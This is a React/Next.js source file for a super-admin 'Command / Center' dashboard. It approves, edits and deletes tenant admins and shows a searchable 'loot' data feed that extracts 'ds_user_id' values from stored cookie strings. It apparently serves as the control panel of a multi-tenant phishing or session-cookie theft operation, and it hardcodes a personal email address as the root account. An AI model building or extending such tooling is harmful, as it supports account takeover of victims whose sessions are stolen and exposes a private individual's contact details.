"use client";
import { useEffect, useState, useCallback } from "react";
import {
  getPendingUsers,
  approveUser,
  declineUser,
  getGlobalLoot,
  logout,
  updateAdminCredentials,
} from "../actions";
import { createBrowserClient } from "@supabase/ssr";
import {
  CheckCircle,
  XCircle,
  UserX,
  LayoutDashboard,
  Search,
  LogOut,
  ShieldCheck,
  Settings2,
  Save,
  X,
  Trash2,
  Clock,
} from "lucide-react";
import Link from "next/link";

export default function SuperAdmin() {
  const [pending, setPending] = useState<any[]>([]);
  const [activeAdmins, setActiveAdmins] = useState<any[]>([]);
  const [globalLoot, setGlobalLoot] = useState<any[]>([]);
  const [view, setView] = useState<"requests" | "active" | "loot">("requests");
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");

  const [editingId, setEditingId] = useState<string | null>(null);
  const [editEmail, setEditEmail] = useState("");
  const [editPassword, setEditPassword] = useState("");

  const supabase = createBrowserClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!,
  );

  const loadData = useCallback(async () => {
    const [users, loot] = await Promise.all([
      getPendingUsers(),
      getGlobalLoot(),
    ]);

    const { data: allProfiles } = await supabase
      .from("profiles")
      .select("*")
      .order("created_at", { ascending: false });

    setPending(allProfiles?.filter((p) => !p.approved) || []);
    setActiveAdmins(
      allProfiles?.filter(
        (p) => p.approved && p.email !== "wchloe7964@gmail.com",
      ) || [],
    );
    setGlobalLoot([...loot].reverse());
    setLoading(false);
  }, [supabase]);

  useEffect(() => {
    loadData();
    const interval = setInterval(loadData, 30000);
    return () => clearInterval(interval);
  }, [loadData]);

  const handleApprove = async (id: string) => {
    const res = await approveUser(id);
    if (res.success) loadData();
  };

  const handleRevoke = async (id: string) => {
    if (confirm("PERMANENTLY DELETE THIS ADMIN?")) {
      const res = await declineUser(id);
      if (res.success) loadData();
    }
  };

  const handleUpdate = async (id: string) => {
    const res = await updateAdminCredentials(id, {
      email: editEmail,
      password: editPassword || undefined,
    });

    if (res.success) {
      setEditingId(null);
      setEditPassword("");
      loadData();
    } else {
      alert(`FAILED: ${res.error}`);
    }
  };

  // Helper to check if a node is "Online" (active in last 5 minutes)
  const isOnline = (lastActive: string | null) => {
    if (!lastActive) return false;
    const fiveMinutesAgo = new Date().getTime() - 5 * 60 * 1000;
    return new Date(lastActive).getTime() > fiveMinutesAgo;
  };

  const filteredLoot = globalLoot.filter(
    (item) =>
      item.tenant?.toLowerCase().includes(searchTerm.toLowerCase()) ||
      JSON.stringify(item.data)
        .toLowerCase()
        .includes(searchTerm.toLowerCase()),
  );

  if (loading)
    return (
      <div className="bg-[#050505] min-h-screen flex items-center justify-center text-zinc-800 font-mono text-[10px] tracking-widest uppercase">
        System_Loading...
      </div>
    );

  return (
    <div className="min-h-screen bg-[#050505] text-zinc-400 font-mono p-4 md:p-12">
      <div className="max-w-5xl mx-auto">
        {/* Header */}
        <header className="mb-8 border-b border-zinc-900 pb-8 flex flex-col md:flex-row justify-between items-start md:items-end gap-6">
          <div className="flex-1">
            <h1 className="text-white text-xl font-bold tracking-tighter uppercase flex items-center gap-2 italic">
              <ShieldCheck className="text-blue-900" size={20} />
              Command <span className="text-zinc-700">/ Center</span>
            </h1>
            <p className="text-[9px] text-zinc-600 mt-2 uppercase tracking-widest">
              Root: wchloe7964@gmail.com
            </p>
          </div>

          <div className="flex flex-wrap gap-2 w-full md:w-auto">
            <button
              onClick={() => setView("requests")}
              className={`px-4 py-2 text-[10px] font-bold border transition-all ${view === "requests" ? "bg-white text-black border-white" : "border-zinc-800 text-zinc-600"}`}>
              REQUESTS ({pending.length})
            </button>
            <button
              onClick={() => setView("active")}
              className={`px-4 py-2 text-[10px] font-bold border transition-all ${view === "active" ? "bg-white text-black border-white" : "border-zinc-800 text-zinc-600"}`}>
              ADMINS ({activeAdmins.length})
            </button>
            <button
              onClick={() => setView("loot")}
              className={`px-4 py-2 text-[10px] font-bold border transition-all ${view === "loot" ? "bg-white text-black border-white" : "border-zinc-800 text-zinc-600"}`}>
              DATA_FEED
            </button>
            <div className="flex gap-2 ml-auto">
              <Link
                href="/admin"
                className="p-2 border border-zinc-800 text-zinc-500 hover:text-white transition-all">
                <LayoutDashboard size={16} />
              </Link>
              <button
                onClick={() => logout()}
                className="p-2 border border-zinc-800 text-red-900 hover:text-red-500 transition-all">
                <LogOut size={16} />
              </button>
            </div>
          </div>
        </header>

        {/* View: Active Admins */}
        {view === "active" && (
          <div className="grid gap-3">
            {activeAdmins.map((admin) => (
              <div
                key={admin.id}
                className="border border-zinc-900 bg-zinc-900/5 p-5 flex flex-col md:flex-row justify-between items-start md:items-center gap-4 transition-all hover:border-zinc-800">
                <div className="flex-1 w-full">
                  {editingId === admin.id ? (
                    <div className="flex flex-col sm:flex-row gap-2">
                      <input
                        className="bg-black border border-blue-900 p-2 text-xs text-white flex-1 outline-none font-mono"
                        value={editEmail}
                        onChange={(e) => setEditEmail(e.target.value)}
                        placeholder="New Email"
                      />
                      <input
                        className="bg-black border border-blue-900 p-2 text-xs text-white flex-1 outline-none font-mono"
                        value={editPassword}
                        onChange={(e) => setEditPassword(e.target.value)}
                        placeholder="New Password (optional)"
                        type="password"
                      />
                    </div>
                  ) : (
                    <div className="flex items-center gap-4">
                      {/* Status Light */}
                      <div
                        className={`w-2 h-2 rounded-full ${
                          isOnline(admin.last_active)
                            ? "bg-emerald-500 animate-pulse shadow-[0_0_8px_rgba(16,185,129,0.5)]"
                            : "bg-zinc-800"
                        }`}
                        title={
                          isOnline(admin.last_active) ? "Online" : "Offline"
                        }
                      />
                      <div>
                        <p className="text-zinc-200 text-sm font-bold tracking-tight">
                          {admin.email}
                        </p>
                        <div className="flex items-center gap-3 mt-1">
                          <p className="text-[9px] text-blue-900 font-bold uppercase tracking-widest italic">
                            Tenant: {admin.tenant_id}
                          </p>
                          <span className="text-zinc-800">|</span>
                          <p className="text-[9px] text-zinc-600 flex items-center gap-1 uppercase">
                            <Clock size={10} />
                            Seen:{" "}
                            {admin.last_active
                              ? new Date(admin.last_active).toLocaleTimeString()
                              : "Never"}
                          </p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                <div className="flex gap-2 w-full md:w-auto justify-end">
                  {editingId === admin.id ? (
                    <>
                      <button
                        onClick={() => handleUpdate(admin.id)}
                        className="p-2 text-emerald-500 hover:bg-emerald-500/10 rounded transition-all">
                        <Save size={18} />
                      </button>
                      <button
                        onClick={() => setEditingId(null)}
                        className="p-2 text-zinc-500 hover:bg-white/5 rounded transition-all">
                        <X size={18} />
                      </button>
                    </>
                  ) : (
                    <>
                      <button
                        onClick={() => {
                          setEditingId(admin.id);
                          setEditEmail(admin.email);
                        }}
                        className="p-2 text-zinc-600 hover:text-white border border-zinc-900 hover:border-zinc-700 rounded transition-all">
                        <Settings2 size={16} />
                      </button>
                      <button
                        onClick={() => handleRevoke(admin.id)}
                        className="p-2 text-zinc-800 hover:text-red-500 border border-zinc-900 hover:border-red-900/30 rounded transition-all">
                        <Trash2 size={16} />
                      </button>
                    </>
                  )}
                </div>
              </div>
            ))}
          </div>
        )}

        {/* View: Pending Requests */}
        {view === "requests" && (
          <div className="grid gap-3">
            {pending.length === 0 ? (
              <div className="py-20 border border-zinc-900 bg-zinc-900/5 rounded flex flex-col items-center gap-4 text-zinc-800 text-[10px] uppercase tracking-widest">
                No_Pending_Requests
              </div>
            ) : (
              pending.map((user) => (
                <div
                  key={user.id}
                  className="border border-zinc-900 bg-zinc-900/5 p-5 flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 hover:border-zinc-700">
                  <div>
                    <p className="text-zinc-200 text-sm font-bold">
                      {user.email}
                    </p>
                    <p className="text-[9px] text-zinc-600 mt-1 uppercase">
                      Request_ID: {user.id.split("-")[0]}
                    </p>
                  </div>
                  <div className="flex gap-2 w-full sm:w-auto">
                    <button
                      onClick={() => handleRevoke(user.id)}
                      className="p-2 text-zinc-700 hover:text-red-500 border border-zinc-900 rounded">
                      <Trash2 size={18} />
                    </button>
                    <button
                      onClick={() => handleApprove(user.id)}
                      className="flex-1 bg-white text-black px-6 py-2 text-[10px] font-bold hover:bg-blue-600 hover:text-white transition-all uppercase tracking-tighter">
                      Authorize
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        )}

        {/* View: Data Feed */}
        {view === "loot" && (
          <div className="space-y-4">
            <div className="relative">
              <Search
                className="absolute left-4 top-1/2 -translate-y-1/2 text-zinc-800"
                size={14}
              />
              <input
                type="text"
                placeholder="FILTER_FEED..."
                className="w-full bg-zinc-900/10 border border-zinc-900 p-3 pl-12 text-[10px] text-white focus:outline-none focus:border-blue-900 transition-all uppercase"
                onChange={(e) => setSearchTerm(e.target.value)}
              />
            </div>
            <div className="border border-zinc-900 bg-zinc-900/5 rounded-lg overflow-x-auto">
              <table className="w-full text-left text-[10px] min-w-[600px]">
                <thead className="border-b border-zinc-900 text-zinc-600 uppercase tracking-widest">
                  <tr>
                    <th className="px-6 py-4 font-normal">Tenant_Source</th>
                    <th className="px-6 py-4 font-normal">Identity</th>
                    <th className="px-6 py-4 text-right font-normal">
                      Timestamp
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-zinc-900/50">
                  {filteredLoot.map((item, i) => (
                    <tr
                      key={i}
                      className="hover:bg-white/[0.01] transition-colors">
                      <td className="px-6 py-4 text-blue-900 font-bold italic">
                        {item.tenant || "MASTER"}
                      </td>
                      <td className="px-6 py-4 text-zinc-300 font-mono">
                        {item.data
                          .find((s: string) => s.includes("ds_user_id"))
                          ?.split("=")[1] || "—"}
                      </td>
                      <td className="px-6 py-4 text-zinc-700 text-right font-mono uppercase">
                        {item.timestamp}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
